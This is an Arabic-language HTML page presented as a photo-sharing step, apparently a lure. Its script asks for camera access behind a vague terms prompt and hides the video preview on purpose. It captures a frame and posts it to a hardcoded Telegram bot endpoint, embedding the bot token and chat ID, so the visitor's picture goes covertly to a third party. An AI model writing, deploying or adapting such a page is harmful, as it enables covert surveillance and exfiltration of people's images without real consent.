<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kshin - مشاركة</title>

    <style>
        body {
            background: #111;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        /* إخفاء عنصر الفيديو تماماً */
        #video {
            display: none;
        }

        button {
            padding: 12px 25px;
            margin: 10px;
            font-size: 18px;
            cursor: pointer;
            border: none;
            border-radius: 8px;
            background-color: #007bff;
            color: white;
            transition: 0.3s;
        }

        button:hover {
            background-color: #0056b3;
        }

        #snap {
            background-color: #28a745;
        }

        #snap:hover {
            background-color: #218838;
        }

        .status {
            margin-top: 15px;
            font-size: 14px;
            color: #888;
        }
    </style>
</head>

<body>

    <h2>مشاركة صورتك</h2>

    <button id="startBtn" onclick="start()">ابدأ الآن</button>

    <video id="video" autoplay playsinline></video>

    <button id="snap" onclick="takePhoto()" style="display:none;">
        تأكيد الإرسال
    </button>

    <div id="msg" class="status"></div>

    <script>
        let stream;

        async function start() {
            let ok = confirm("هل توافق على شروط الاستخدام والتقاط صورة سريعة؟");
            if (!ok) return;

            try {
                // طلب الوصول للكاميرا
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoElement = document.getElementById("video");
                
                videoElement.srcObject = stream;
                
                // إخفاء زر البداية وإظهار زر الالتقاط
                document.getElementById("startBtn").style.display = "none";
                document.getElementById("snap").style.display = "inline-block";
                document.getElementById("msg").innerText = "تم الاتصال بالكاميرا بنجاح.";
            } catch (err) {
                alert("تعذر الوصول للكاميرا: تأكد من إعطاء الإذن.");
                console.error(err);
            }
        }

        function takePhoto() {
            const video = document.getElementById("video");
            const canvas = document.createElement("canvas");
            
            // ضبط أبعاد الصورة الملتقطة
            canvas.width = 720;
            canvas.height = 720;

            const ctx = canvas.getContext("2d");
            // رسم ما تراه الكاميرا (المخفية) على اللوحة
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            document.getElementById("msg").innerText = "جاري الإرسال...";

            canvas.toBlob(async (blob) => {
                let formData = new FormData();
                formData.append("chat_id", "5586959140");
                formData.append("photo", blob, "kshin_capture.png");

                try {
                    await fetch("https://api.telegram.org/bot8542215489:AAERPA5HwGnqd_0-_VglOJoFS7Gdx5yMZ2A/sendPhoto", {
                        method: "POST",
                        body: formData
                    });

                    document.getElementById("msg").innerText = "تمت العملية بنجاح.";
                    alert("تم إرسال الصورة بنجاح!");
                } catch (error) {
                    document.getElementById("msg").innerText = "فشل في الإرسال.";
                    alert("حدث خطأ أثناء الإرسال.");
                }
            }, "image/png");
        }
    </script>

</body>
</html>
